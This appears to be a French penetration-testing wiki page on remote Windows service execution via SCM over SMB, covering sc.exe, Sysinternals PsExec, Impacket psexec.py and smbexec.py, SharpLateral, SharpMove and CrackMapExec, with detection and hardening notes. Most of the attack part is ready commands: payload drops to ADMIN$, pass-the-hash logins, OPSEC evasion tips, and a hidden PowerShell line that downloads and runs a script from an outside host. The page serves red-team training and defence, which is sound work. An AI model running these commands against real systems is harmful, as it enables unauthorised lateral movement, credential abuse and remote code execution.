# Exécution de services à distance (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Comment fonctionnent-ils

Ces techniques détournent le Windows Service Control Manager (SCM) à distance via SMB/RPC pour exécuter des commandes sur un hôte cible. Le Service Control Manager Remote Protocol (SCMR) est l’interface basée sur RPC qui permet de configurer et de contrôler les services Windows sur un ordinateur distant. Avec des permissions suffisantes, un opérateur peut créer ou reconfigurer un service dont le chemin binaire contient une commande, puis démarrer ce service pour l’exécuter à distance.<sup>[[5]](#references)</sup> Le déroulement habituel est le suivant :

1. S’authentifier auprès de la cible via SMB/RPC (TCP/445) ; accéder au partage ADMIN$ si la variante choisie doit y déposer un fichier ou récupérer la sortie.
2. Copier un exécutable ou spécifier une ligne de commande LOLBAS que le service exécutera.
3. Créer un service à distance via SCM (MS-SCMR sur \PIPE\svcctl) pointant vers cette commande ou ce binaire.
4. Démarrer le service pour exécuter la charge utile et, éventuellement, capturer stdin/stdout via un canal nommé.
5. Arrêter le service et effectuer le nettoyage (supprimer le service et les éventuels binaires déposés).

Prérequis :
- Être Administrateur local sur la cible (SeCreateServicePrivilege) ou disposer explicitement des droits nécessaires à la création de services sur la cible.
- SMB (445) doit être accessible et Remote Service Management autorisé par le pare-feu de l’hôte ; ADMIN$ doit être disponible pour les variantes qui l’utilisent pour déposer un fichier ou récupérer la sortie.
- Restrictions UAC à distance : avec des comptes locaux, le filtrage des jetons peut bloquer les administrateurs sur le réseau, sauf si le compte Administrator intégré est utilisé ou si LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM : l’utilisation d’un nom d’hôte/FQDN permet Kerberos ; une connexion par adresse IP revient souvent à NTLM (et peut être bloquée dans les environnements renforcés).

Si aucun compte de service n’est spécifié, `CreateService` utilise `LocalSystem`, qui dispose de nombreux privilèges locaux. Cela explique l’impact important d’une exécution SCM réussie. Elle ne désactive pas intrinsèquement UAC ou Microsoft Defender : l’appelant doit toujours disposer des droits SCM à distance, et les contrôles de sécurité des terminaux peuvent inspecter ou bloquer le service ou la charge utile.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### ScExec/WinExec manuel via sc.exe

Voici une méthode minimale de création de service. Le chemin de l’image du service peut désigner un EXE déposé ou un LOLBAS comme cmd.exe ou powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notes :
- Attendez-vous à une erreur de timeout lors du démarrage d’un EXE qui n’est pas un service ; l’exécution a tout de même lieu.
- Pour rester plus OPSEC-friendly, privilégiez les commandes fileless (`cmd /c`, `powershell -enc`) ou supprimez les artefacts déposés.

Vous trouverez des étapes plus détaillées ici : https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Outils et exemples

### Sysinternals PsExec.exe

- Outil d’administration classique qui utilise SMB pour déposer PSEXESVC.exe dans ADMIN$, installe un service temporaire (nom par défaut : PSEXESVC) et relaie les entrées/sorties via des named pipes.
- Exemples d’utilisation :<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Vous pouvez le lancer directement depuis Sysinternals Live via WebDAV :

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Laisse des événements d’installation/désinstallation de service (le nom du service est souvent PSEXESVC, sauf si `-r` est utilisé) et crée `C:\Windows\PSEXESVC.exe` pendant l’exécution.

### Impacket psexec.py (PsExec-like)

- Utilise un service de type RemCom intégré. Dépose un binaire de service temporaire (souvent avec un nom aléatoire) via ADMIN$, crée un service (souvent RemComSvc par défaut) et relaie les E/S via un named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Sur Kali, les exemples d’Impacket se trouvent parfois dans `/usr/share/doc/python3-impacket/examples/`. Si aucun mot de passe n’est fourni, l’outil en demande un. L’option `-k` d’Impacket demande une authentification Kerberos plutôt que NTLM, généralement à l’aide du cache d’identifiants actuel ou des identifiants fournis.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artefacts
- EXE temporaire dans C:\Windows\ (8 caractères aléatoires). Le nom du service est RemComSvc par défaut, sauf s’il est remplacé.

### Impacket smbexec.py (SMBExec)

- Crée un service temporaire qui lance cmd.exe et utilise un named pipe pour les E/S. Évite généralement de déposer un payload EXE complet ; l’exécution de commandes est semi-interactive.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral et SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implémente plusieurs méthodes de mouvement latéral, notamment l’exécution via des services.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) prend en charge l’exécution distante authentifiée via SCM et plusieurs autres mécanismes Windows, notamment la modification/la création de services.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Vous pouvez également utiliser CrackMapExec pour exécuter des commandes via différents backends (psexec/smbexec/wmiexec) :

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec avec SharpMove

L’action SCM crée un service nommé `WindowsDebug` et le fait pointer vers un payload déjà présent sur l’hôte distant.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, détection et artefacts

Artefacts typiques sur l’hôte/le réseau lors de l’utilisation de techniques de type PsExec :
- Événements Security 4624 (Logon Type 3) et 4672 (Special Privileges) sur la cible pour le compte admin utilisé.
- Événements Security 5140/5145 File Share et File Share Detailed indiquant l’accès à ADMIN$ et la création/l’écriture de binaires de service (p. ex., PSEXESVC.exe ou un fichier .exe aléatoire de 8 caractères).
- **System** 7045 du Service Control Manager pour l’installation d’un service sur la cible : noms tels que PSEXESVC, RemComSvc ou personnalisés (`-r` / `-service-name`). Cela prouve qu’un service a été installé, pas que son image a été exécutée. Corrélez son horodatage et son chemin d’image avec les événements de processus ou une entrée prefetch correspondante pour l’image du service, si disponible.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) pour services.exe ou l’image du service, 3 (Network Connect), 11 (File Create) dans C:\Windows\, 17/18 (Pipe Created/Connected) pour les pipes tels que \\.\pipe\psexesvc, \\.\pipe\remcom_* ou leurs équivalents randomisés.
- Artefact de registre pour l’EULA de Sysinternals : HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 sur l’hôte de l’opérateur (si l’option n’a pas été supprimée).

Idées de recherche
- Déclencher une alerte lors de l’installation de services dont l’ImagePath contient cmd.exe /c, powershell.exe ou des emplacements TEMP.
- Rechercher les créations de processus dont le ParentImage est C:\Windows\PSEXESVC.exe ou les processus enfants de services.exe exécutés en tant que LOCAL SYSTEM et lançant des shells.
- Signaler les pipes nommés se terminant par -stdin/-stdout/-stderr ou portant des noms de pipe connus de clones de PsExec.

## Résolution des problèmes courants
- Accès refusé (5) lors de la création de services : l’utilisateur n’est pas réellement admin local, les restrictions UAC à distance s’appliquent aux comptes locaux ou la protection contre les altérations de l’EDR bloque le chemin du binaire de service.
- Le chemin réseau est introuvable (53) ou la connexion à ADMIN$ a échoué : le pare-feu bloque SMB/RPC ou les partages administratifs sont désactivés.
- Kerberos échoue, mais NTLM est bloqué : connectez-vous avec le nom d’hôte/FQDN (pas l’adresse IP), vérifiez que les SPN sont corrects ou fournissez `-k`/`-no-pass` avec des tickets lors de l’utilisation d’Impacket.
- Le délai d’attente du démarrage du service est dépassé, mais la charge utile s’est exécutée : c’est attendu si ce n’est pas un véritable binaire de service ; capturez la sortie dans un fichier ou utilisez smbexec pour obtenir des E/S en direct.

## Remarques sur le renforcement de la sécurité
- Windows 11 24H2 et Windows Server 2025 exigent par défaut la signature SMB pour les connexions sortantes (et entrantes sous Windows 11). Cela ne perturbe pas l’utilisation légitime de PsExec avec des identifiants valides, mais empêche les abus de relais SMB non signé et peut affecter les appareils qui ne prennent pas en charge la signature.<sup>[[2]](#references)</sup>
- Le nouveau blocage NTLM du client SMB (Windows 11 24H2/Server 2025) peut empêcher le recours à NTLM lors d’une connexion par adresse IP ou à des serveurs non-Kerberos. Dans les environnements renforcés, cela empêchera l’utilisation de PsExec/SMBExec basés sur NTLM ; utilisez Kerberos (nom d’hôte/FQDN) ou configurez des exceptions si nécessaire dans un cadre légitime.<sup>[[2]](#references)</sup>
- Principe du moindre privilège : limitez l’appartenance au groupe des administrateurs locaux, privilégiez Just-in-Time/Just-Enough Admin, appliquez LAPS et surveillez/alertez en cas d’installation de services 7045.

## Voir aussi

- Exécution à distance basée sur WMI (souvent davantage fileless) :

{{#ref}}
./wmiexec.md
{{#endref}}

- Exécution à distance basée sur WinRM :

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Renforcement de la sécurité SMB dans Windows Server 2025 et Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Utiliser des identifiants pour prendre le contrôle de machines Windows - Partie 2 (PSExec et services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Résoudre les redémarrages inattendus à l’aide des journaux d’événements système](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Présentation du protocole Remote Service Control Manager](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - Compte LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - Fonction `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
